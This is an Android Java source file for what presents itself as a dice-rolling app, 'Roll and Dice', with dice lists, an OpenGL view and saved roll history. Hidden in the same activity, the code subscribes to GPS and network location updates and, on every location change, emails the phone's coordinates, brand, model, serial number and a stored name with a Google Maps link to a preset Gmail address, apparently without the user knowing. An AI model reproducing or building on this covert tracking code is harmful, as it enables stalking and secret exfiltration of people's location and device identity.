package ch.hearc.rollanddice;

import android.app.ActionBar;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.SharedPreferences;
import android.content.pm.ConfigurationInfo;
import android.content.Context;
import android.content.Intent;
import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.opengl.GLSurfaceView;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.support.v4.app.ActivityCompat;
import android.support.v7.widget.RecyclerView;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.SimpleAdapter;
import android.widget.TextView;

import ch.hearc.rollanddice.common.*;
import ch.hearc.rollanddice.MyGLRenderer;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends Activity implements LocationListener {
    private TextView textViewResult;
    private String textSave;
    private ArrayList<EditText> nbDices = new ArrayList<>();

    private LocationManager locationManager;

    private ListView listView;
    private ArrayList<String> textDices = new ArrayList<>();
    private ArrayList<String> textFaceDices = new ArrayList<>();
    private ArrayList<String> textNbDices = new ArrayList<>();
    MainActivity.MyListAdapter myListAdapter;
    private Map<Integer, Integer> listRolledDices = new HashMap<Integer, Integer>();


    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);


        textViewResult = (TextView)findViewById(R.id.textViewResult);
        Button btnRoll = (Button)findViewById(R.id.buttonRoll);
        btnRoll.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v){
                updateListRolledDices();
                createOpenGlView();
            }
        });
        Button btnStats = (Button)findViewById(R.id.buttonStats);
        btnStats.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                Intent demarre = new Intent(MainActivity.this, StatsActivity.class);
                startActivity(demarre);
            }
        });
        Button btnNewDice = (Button)findViewById(R.id.buttonNewDice);
        btnNewDice.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                newDice();
            }
        });

        Button btnSecret = (Button)findViewById(R.id.buttonSecret);
        btnSecret.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                Intent demarre = new Intent(MainActivity.this, SecretActivity.class);
                startActivity(demarre);
            }
        });

        ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);

        locationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);

        try{
            Log.v("Location", "try location");
            locationManager.requestLocationUpdates(locationManager.GPS_PROVIDER, 300000, 100, this);
            locationManager.requestLocationUpdates(locationManager.NETWORK_PROVIDER, 300000, 100, this);
            locationManager.requestLocationUpdates(locationManager.PASSIVE_PROVIDER, 300000, 100, this);
            Log.v("Location", "Attempt location");
            //Location lastKnownLocation = locationManager.getLastKnownLocation(locationManager.GPS_PROVIDER);
            //Log.v("Location", "Last : " + lastKnownLocation.toString());
            //sendEmail("Last know location" + lastKnownLocation.toString());
        }catch(SecurityException se){
            Log.v("Location :", "Security Exception");
        }catch(NullPointerException ne){
            //rien
        }

        textDices.add("dé");
        textFaceDices.add("10");
        textNbDices.add("0");

        myListAdapter = new MainActivity.MyListAdapter();
        listView = (ListView) findViewById(R.id.testListView);
        listView.setAdapter(myListAdapter);


    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 1: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Log.v("Location", "Permission granted");
                    return;

                } else {
                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                    Log.v("Location", "Permission denied");
                }
                return;
            }
            // other 'case' lines to check for other
            // permissions this app might request
        }

    }




    public void createOpenGlView(){
        Intent intent = new Intent(this, OpenGLActivity.class);
        intent.putExtra("textFaceDices", textFaceDices);
        intent.putExtra("textNbDices", textNbDices);
        startActivity(intent);
        rollDices();
    }



    /*@Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main_menu, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();

        switch (id) {
            case R.id.test:
                return true;
/*
            case R.id.action_search :
                return true;
            case R.id.action_share :
                return true; */
  /*          default:
                return super.onOptionsItemSelected(item);
        }
    }*/

    protected void updateListRolledDices(){
        listRolledDices.clear();
        for(int i = 0; i < textDices.size(); i++){
            int nbFaces = Integer.parseInt(textFaceDices.get(i));
            int nbDices = Integer.parseInt(textNbDices.get(i));
            if(listRolledDices.containsKey(nbFaces)){
                listRolledDices.put(nbFaces, listRolledDices.get(nbFaces) + nbDices);
            }else{
                listRolledDices.put(nbFaces, nbDices);
            }
        }
    }

    protected void rollDices(){
        textViewResult.setText("");
        textSave = "";
        int total = 0;

        updateListRolledDices();

        for(int nbFaces : listRolledDices.keySet()){
            if(listRolledDices.get(nbFaces) > 0){
                total += rollOneTypeOfDice(nbFaces, listRolledDices.get(nbFaces));
            }
        }

        textSave += total+ "\n";



        textViewResult.setText(textViewResult.getText() + "\nTotal: " + total);
        saveFile();
    }

    protected int rollOneTypeOfDice(int nbFaces, int nbDices){
        String txt = "D" + nbFaces + ": ";
        textSave += nbFaces + "/";
        int total = 0;
        for (int i = 0; i < nbDices; i++) {
            int result = rollOneDice(nbFaces);
            total += result;
            if(i > 0) {
                txt += ", ";
                textSave += ",";
            }
            textSave += result;
            txt += result;
        }
        textSave += "/" + total + ";";

        txt += "   Total: " + total + "\n";
        textViewResult.setText(textViewResult.getText() + txt);
        return total;
    }

    protected int rollOneDice(int nbFaces){
        return (int)(Math.random()*nbFaces+1);
    }

    protected void newDice(){
        textDices.add("dé");
        textFaceDices.add("10");
        textNbDices.add("0");

        myListAdapter.notifyDataSetChanged();
    }

    protected void saveFile(){
        String filename = "RollAndDiceData";
        FileOutputStream outputStream;

        try {
            outputStream = openFileOutput(filename, Context.MODE_APPEND);
            outputStream.write(textSave.getBytes());
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onProviderEnabled(String provider){
        Log.v("Location", "Provider Enable" + provider);
    }

    @Override
    public void onLocationChanged(Location location){
        String msg = "On Location changed :" +"Latitude : " + location.getLatitude() + "Longitude : " + location.getLongitude();
        Log.v("Location" , msg);
        sendEmail(location.getLatitude(), location.getLongitude());
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras){
        Log.v("Location" , "Status Changed");
    }

    @Override
    public void onProviderDisabled(String provider){
        Log.v("Location", "Provider Disabled " + provider);
    }


    //http://www.webplusandroid.com/creating-listview-with-edittext-and-textwatcher-in-android/
    private class MyListAdapter extends BaseAdapter {

        @Override
        public int getCount() {
            // TODO Auto-generated method stub
            if(textDices != null && textDices.size() != 0){
                return textDices.size();
            }
            return 0;
        }

        @Override
        public Object getItem(int position) {
            // TODO Auto-generated method stub
            return textDices.get(position);
        }

        @Override
        public long getItemId(int position) {
            // TODO Auto-generated method stub
            return position;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {



            final MainActivity.MyListAdapter.ViewHolder holder;
            if (convertView == null) {

                holder = new MainActivity.MyListAdapter.ViewHolder();
                LayoutInflater inflater = MainActivity.this.getLayoutInflater();
                convertView = inflater.inflate(R.layout.activity_list2, null);
                holder.textView1 = (TextView) convertView.findViewById(R.id.textView1);
                holder.editText1 = (EditText) convertView.findViewById(R.id.editText1);
                holder.editText2 = (EditText) convertView.findViewById(R.id.editText2);

                convertView.setTag(holder);

            } else {

                holder = (MainActivity.MyListAdapter.ViewHolder) convertView.getTag();
            }

            holder.ref = position;

            holder.textView1.setText(textDices.get(position));
            holder.editText1.setText(textFaceDices.get(position));
            holder.editText1.addTextChangedListener(new TextWatcher() {

                @Override
                public void onTextChanged(CharSequence arg0, int arg1, int arg2, int arg3) {
                    // TODO Auto-generated method stub

                }

                @Override
                public void beforeTextChanged(CharSequence arg0, int arg1, int arg2,
                                              int arg3) {
                    // TODO Auto-generated method stub

                }

                @Override
                public void afterTextChanged(Editable arg0) {
                    // TODO Auto-generated method stub
                    textFaceDices.set(holder.ref, arg0.toString()) ;
                }
            });
            holder.editText2.setText(textNbDices.get(position));
            holder.editText2.addTextChangedListener(new TextWatcher() {

                @Override
                public void onTextChanged(CharSequence arg0, int arg1, int arg2, int arg3) {
                    // TODO Auto-generated method stub

                }

                @Override
                public void beforeTextChanged(CharSequence arg0, int arg1, int arg2,
                                              int arg3) {
                    // TODO Auto-generated method stub

                }

                @Override
                public void afterTextChanged(Editable arg0) {
                    // TODO Auto-generated method stub
                    textNbDices.set(holder.ref, arg0.toString()) ;
                }
            });

            return convertView;
        }

        private class ViewHolder {
            TextView textView1;
            EditText editText1;
            EditText editText2;
            int ref;
        }


    }

    private void sendEmail(double latitude, double longitude) {
        //Getting content for email

        /*TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
        String number = tm.getDeviceId();*/


        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);



        String email = preferences.getString("mail", "superrollanddice@gmail.com");
        String name = preferences.getString("name", "defaultname");
        String subject = "position";
        String message = "Position lattitude : " + latitude + " longitude : " + longitude + "\n" + "\n Model : " + Build.BRAND + " " + android.os.Build.MODEL+ "\nDevice : " +android.os.Build.DEVICE + " " + Build.SERIAL + "\n Name : " + name
                +"\n\n\n http://maps.google.com/?q="+latitude+","+longitude;

        //Creating SendMail object
        SendMail sm = new SendMail(this, email, subject, message);

        //Executing sendmail to send email
        sm.execute();
    }

}
